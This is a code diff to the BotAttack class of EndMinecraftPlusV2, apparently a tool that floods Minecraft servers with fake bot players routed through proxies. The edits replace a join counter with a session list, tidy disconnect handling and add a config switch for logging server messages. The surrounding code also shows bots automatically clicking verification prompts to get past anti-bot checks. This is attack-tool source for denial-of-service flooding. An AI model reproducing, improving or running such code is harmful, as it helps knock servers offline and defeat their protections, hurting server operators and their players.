@@ -38,10 +38,10 @@ import java.util.concurrent.Executors;
 public class BotAttack extends IAttack {
     public static HashMap<Client, String> clientName = new HashMap<>();
     public static int failed = 0;
-    public static int joined = 0;
     public static int rejoin = 0;
     public static int clickVerifies = 0;
     public static List<String> rejoinPlayers = new ArrayList<>();
+    public static List<Session> joinedPlayers = new ArrayList<>();
     public static List<String> alivePlayers = new ArrayList<>();
     public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
     protected boolean attack_motdbefore;
@@ -181,11 +181,14 @@ public class BotAttack extends IAttack {
             String username = clientName.get(client);
 
             if (!client.getSession().isConnected()) {
+                positionPacket.remove(client.getSession());
                 alivePlayers.remove(username);
                 clientName.remove(client);
                 clients.remove(client);
-            } else if (!alivePlayers.contains(username) && (client.getSession().hasFlag("login") || client.getSession().hasFlag("join"))) {
-                alivePlayers.add(username);
+            } else {
+                if (!alivePlayers.contains(username) && (client.getSession().hasFlag("login") || client.getSession().hasFlag("join"))) {
+                    alivePlayers.add(username);
+                }
             }
         }
     }
@@ -206,7 +209,7 @@ public class BotAttack extends IAttack {
         for (String p: ProxyUtil.proxies) {
             try {
                 if (!EndMinecraftPlusV2.isLinux) {
-                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
+                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
                 }
 
                 String[] _p = p.split(":");
@@ -394,7 +397,8 @@ public class BotAttack extends IAttack {
         } else if (recvPacket instanceof ServerJoinGamePacket) {
             session.setFlag("join", true);
             LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
-            joined++;
+
+            joinedPlayers.add(session);
 
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
@@ -420,12 +424,16 @@ public class BotAttack extends IAttack {
 
             Message message = chatPacket.getMessage();
 
-            if (!message.getFullText().equals("")) {
+            if (ConfigUtil.ShowServerMessages && !message.getFullText().equals("")) {
                 LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + message.getFullText(), "BotAttack");
             }
         } else if (recvPacket instanceof ServerKeepAlivePacket) {
             // ClientKeepAlivePacket keepAlivePacket = new ClientKeepAlivePacket(((ServerKeepAlivePacket) recvPacket).getPingId());
             // session.send(keepAlivePacket);
+            if (!joinedPlayers.contains(session)) {
+                joinedPlayers.add(session);
+            }
+
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
             }
@@ -449,6 +457,10 @@ public class BotAttack extends IAttack {
             session.send(new ClientChatPacket(message.getStyle().getClickEvent().getValue()));
             clickVerifies++;
         } else {
+            if (!joinedPlayers.contains(session)) {
+                joinedPlayers.add(session);
+            }
+
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
             }
